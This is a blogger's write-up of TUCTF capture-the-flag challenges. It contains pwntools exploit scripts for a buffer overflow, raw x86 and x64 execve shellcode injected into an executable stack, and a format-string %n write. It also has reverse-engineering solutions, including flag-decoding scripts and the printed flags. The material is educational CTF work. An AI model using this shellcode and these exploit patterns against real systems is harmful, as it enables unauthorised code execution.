I couldn't give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.

# Pwn Challenges

## thefirst - 379 pts

We can see in the image below that `gets` is being used to take the input. Hence it can be exploited for _buffer overflow_. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.

{% include image.liquid url="/assets/img/posts_images/tuctf/thefirst_1.png" description="Disassembly of main" %}

This can be done using `pattern create 50` and then using that pattern to find the crash offset.

{% include image.liquid url="/assets/img/posts_images/tuctf/gef_1.png" %}

{% include image.liquid url="/assets/img/posts_images/tuctf/gef_2.png" %}

Also inspecting the functions, we see that there is a `printFlag` function at 0x80491f6. So, our objective is to jump there.

The following script is the exploit.

```python
from pwn import *

p = process("./thefirst")
# p = remote("chal.tuctf.com", 30508)
print_flag_addr = 0x80491f6
offset = 20

payload = "A"*offset
payload += "BBBB"
payload += p32(print_flag_addr)

f = open('payload', 'wb')
f.write(payload)
f.close()

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
```

## shellme32 - 462 pts

On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using `vmmap`, we find that the adress given to us is that of the stack and the stack is read, write and executable. 

{% include image.liquid url="/assets/img/posts_images/tuctf/shellme32_1.png" %}

We use [shell-storm](http://shell-storm.org/shellcode/files/shellcode-811.php) to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with 'A's and then provide the address to write to, i.e. the adress provided to us.

```python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
len_shell_code = 28

from pwn import *
# context.log_level = 'debug'
p = process("./shellme32")

offset = 40


p.recvuntil('?\n')
addr = int(p.recvline().strip(), 16)
p.recvuntil('> ')

log.info('Stack Address: ' + str(hex(addr)))

payload = shellcode
payload += "A"*(offset - len_shell_code)

payload += p32(addr)

print(len(shellcode))
p.sendline(payload)

with open('payload', 'wb') as f:
    f.write(payload)

p.interactive()
```

---

## shellme64 - 480 pts

This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And  replace `p32` with `p64` when adding the stack address to the payload.

We use [exploit-db](https://www.exploit-db.com/exploits/42179) to get the shellcode. The offset of the crash is same as before.

```python
shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
len_shell_code = 24

from pwn import *
# context.log_level = 'debug'
p = process("./shellme64")

offset = 40


p.recvuntil('this\n')
addr = int(p.recvline().strip(), 16)
p.recvuntil('> ')

log.info('Stack Address: ' + str(hex(addr)))

payload = shellcode
payload += "A"*(offset - len(shellcode))

# with open('payload', 'wb') as f:
#     f.write(payload)
payload += p64(addr)

p.sendline(payload)

with open('payload', 'wb') as f:
    f.write(payload)

p.interactive()
```

## printfun - 500 pts

Here, on analysing with Ghidra, we find that there is a format string vulnerability.

{% include image.liquid url="/assets/img/posts_images/tuctf/printfun_1.png" %}

So, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide `"%x %x %x %x %x %x %x %x %x %x %x %x %x %x"`, for the instance running on GDB we get this output -

`5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0`

On seeing the values displayed by GDB, we see two addresses - `0x5655a008` and `0x5655a050`

{% include image.liquid url="/assets/img/posts_images/tuctf/printfun_2.png" %}

This is intereting as both these addresses are also present in the program's output with our input.

So, all we have to do is overwrite the 6th and 7th "addresses" of the output to the same value so that the string comparison passes.

We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -

```python
from pwn import *

p = process("printfun")

payload = "AAAA%6$n%7$n"

p.sendlineafter('? ', payload)

p.interactive()
```

# Rev Challenges

## faker - 400 pts

If we open the binary in Ghidra, we see that there are calls to different functions, namely _A_, _B_ and _C_, which depend on the user input. But on trying them, we get fake flags.

{% include image.liquid url="/assets/img/posts_images/tuctf/faker.png" %}

But all of them have a common structure, they have a call to `printFlag` with a string. 

{% include image.liquid url="/assets/img/posts_images/tuctf/faker_1.png" %}

Also in the functions list, we see that there is a function named `thisone`. First we take a look at `printFlag` function.

{% include image.liquid url="/assets/img/posts_images/tuctf/faker_2.png" %}

There can be two ways to solve this challenge.

### Method 1 - Static

Write a script to emulate the functionality of the `printFlag` function.

```python
def printFlag(s):
    s2 = ""
    for i in range(len(s)):
        x = ((((ord(s[i]) ^ 0xf) - 0x1d) * 8) % 0x5f) + 0x20
        s2 += chr(x)
    print(s2)

printFlag("\\PJ\\fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k")
```

This gives us the flag - `TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}`

### Method 2 - Dynamic

Here set a breakpoint in main and then run the following commads in GDB.

```bash
(gdb) info functions  # get address of printFlag function
(gdb) set $rip=0x000055555555534b   # i.e. to the address of the function
(gdb) c
```

This will print the flag.

## core - 400 pts

We a re provided a core dump and a C file. The C file looks like this

```c
#include <stdio.h>  // prints
#include <stdlib.h> // malloc
#include <string.h> // strcmp
#include <unistd.h> // read
#include <fcntl.h>  // open
#include <unistd.h> // close
#include <time.h>   // time

#define FLAG_LEN 64
char flag[FLAG_LEN];

void xor(char *str, int len) {
	for (int i = 0; i < len; i++) {
		str[i] = str[i] ^ 1;
	}
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 20);
    setvbuf(stdin, NULL, _IONBF, 20);

	// Read the flag
	memset(flag, 0, FLAG_LEN);
	printf("> ");
	int len = read(0, flag, FLAG_LEN);

	xor(flag, len);

	char buf[32];
	read(0, buf, 128);

    return 0;
}
```

Basically we are XORing the input string with 1. We assume that flag is in the standard format, i.e. begins with `TUCTF`. So we pre-calculate, the starting of the string that should be in memory.

`TUCTF` => `UTBUG`

We use `xxd` to view the core.

{% include image.liquid url="/assets/img/posts_images/tuctf/core.png" %}

We find something interesting in the memory. On decoding

```python
core_string = "55544255477a623173325e65746c713e5e4f327732735e69323573655e31675e7831747c".decode('hex')

flag = ""

for i in core_string:
    flag += chr(ord(i) ^ 1)

print(flag)
```

The flag - `TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}`

That's all for now :wave:.
